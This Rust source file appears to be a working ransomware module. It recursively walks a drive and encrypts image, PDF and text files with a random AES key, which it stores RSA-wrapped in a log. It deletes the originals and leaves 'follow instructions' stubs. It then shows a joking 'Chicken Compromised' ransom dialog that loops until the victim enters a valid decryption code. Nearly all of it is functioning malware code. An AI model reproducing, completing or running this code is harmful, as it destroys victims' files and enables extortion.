use crate::cry;

#[allow(dead_code)]
pub fn enc_file (src: &str, dst: &str, key: &cry::KeyIv) -> bool {
  !std::panic::catch_unwind(|| {
    let s = std::fs::read(src).unwrap();
    let encrypted = cry::encrypt(&s, key).unwrap();
    std::fs::write(dst, &encrypted).unwrap();
  }).is_err()
}

#[allow(dead_code)]
pub fn dec_file (src: &str, dst: &str, key: &cry::KeyIv) -> bool {
  !std::panic::catch_unwind(|| {
    let folder = std::path::Path::new(&dst).parent().unwrap();
    std::fs::create_dir_all(folder).unwrap();
    let s = std::fs::read(src).unwrap();
    let decrypted = cry::decrypt(&s, key).unwrap();
    std::fs::write(dst, &decrypted).unwrap();
  }).is_err()
}

fn visit_dirs(dir: &std::path::Path, cb: &mut FnMut(&std::fs::DirEntry)) -> std::io::Result<()> {
  if dir.is_dir() {
    for entry in std::fs::read_dir(dir)? {
      let entry = entry?;
      let path = entry.path();
      if path.is_dir() {
        visit_dirs(&path, cb)?;
      } else {
        cb(&entry);
      }
    }
  }
  Ok(())
}

#[allow(dead_code)]
pub fn enc_drive(rsa: &rsa::RSAPublicKey, home: &str, mut log: &std::fs::File, drive: &str) {
  use std::io::Write;
  let key = cry::rnd_key_iv();
  let mut ext_wl = std::collections::HashSet::new();
  ext_wl.insert("jpg");
  ext_wl.insert("jpeg");
  ext_wl.insert("png");
  ext_wl.insert("pdf");
  ext_wl.insert("txt");
  ext_wl.insert("odt");


  log.write_all(format!("KEY {}\n", cry::b64e(&cry::rsa_encrypt(rsa, &key.to_bytes()))).as_bytes()).unwrap();

  visit_dirs(std::path::Path::new(drive), &mut |f| {
    let path = f.path();
    let src_path = path.to_str().unwrap().to_string();
    let ext = path.extension();
    if ext.is_none() { return }
    let ext = ext.unwrap().to_str().unwrap();
    if src_path.ends_with(crate::ENCR_SUFFIX) || !ext_wl.contains(&ext){ return }

    println!("encrypting file {}", src_path);
    let dst_name = cry::sha1(&src_path);
    let dst_path = format!("{}/{}/{}", home, crate::ENCR_FOLDER, dst_name);
    if enc_file(&src_path, &dst_path, &key) {
      log.write_all(format!("FILE {} {}\n", dst_name, cry::b64e(src_path.as_bytes())).as_bytes()).unwrap();
      std::panic::catch_unwind(|| {
        std::fs::remove_file(&src_path).unwrap();
        std::fs::write(format!("{}{}", src_path, crate::ENCR_SUFFIX), "follow instructions").unwrap();
      }).unwrap_or(());
    }
  }).expect("Cannot visit drive");
}



#[allow(dead_code)]
pub fn infect(home: &str) -> std::fs::File {
  std::fs::create_dir_all(format!("{}/{}", home, crate::ENCR_FOLDER)).unwrap();
  std::fs::OpenOptions::new()
  .create(true)
  .append(true)
  .open(format!("{}/{}", home, crate::LOG_FILE)).expect("Cannot create log file")
}

pub fn decrypt (rsa_prv: rsa::RSAPrivateKey, home: &str, mut log: &std::fs::File) {
  use std::io::BufRead;
  use std::io::Seek;
  log.seek(std::io::SeekFrom::Start(0)).unwrap();
  let reader = std::io::BufReader::new(log);


  let mut aes_key = cry::KeyIv::blank();

  for line in reader.lines() {
    if line.is_err() { continue }
    let line = line.unwrap();
    println!("line: {}", line);
    let splitted: Vec<&str> = line.split(" ").collect();
    if splitted[0] == "KEY" {
      println!("cambiata chiave");
      aes_key = cry::KeyIv::from_bytes(&cry::rsa_decrypt(&rsa_prv, &cry::b64d(splitted[1])).unwrap())
    }
    else if splitted[0] == "FILE" {
      println!("decritto file");
      let enc_file = format!("{}/{}/{}", home, crate::ENCR_FOLDER, splitted[1]);
      let orig_path = String::from_utf8(cry::b64d(splitted[2])).unwrap();
      if dec_file(&enc_file, &orig_path, &aes_key) {
        std::fs::remove_file(&format!("{}{}", orig_path, crate::ENCR_SUFFIX)).unwrap_or(());
        std::fs::remove_file(enc_file).unwrap_or(());
      }
    }
  }

}


pub fn prompt_key(pub_key: &str) -> rsa::RSAPrivateKey {

  use dialog::DialogBox;


  let code = dialog::Input::new("Please contact me if you want some chicken.\nUse the field below to fry it.")
      .title("Chicken Compromised")
      .show()
      .expect("Could not display dialog box");

  match code {
      Some(code) => {
        let rsa_prv = cry::decode_prv(&vec![pub_key.to_string(), code].join("-"));
        if rsa_prv.is_none() {
          dialog::Message::new("Invalid code.")
              .title("Error!")
              .show()
              .unwrap_or(());
          return prompt_key(pub_key);

        } else {
          return rsa_prv.unwrap()
        }
      },
      None => return prompt_key(pub_key),
  };
}
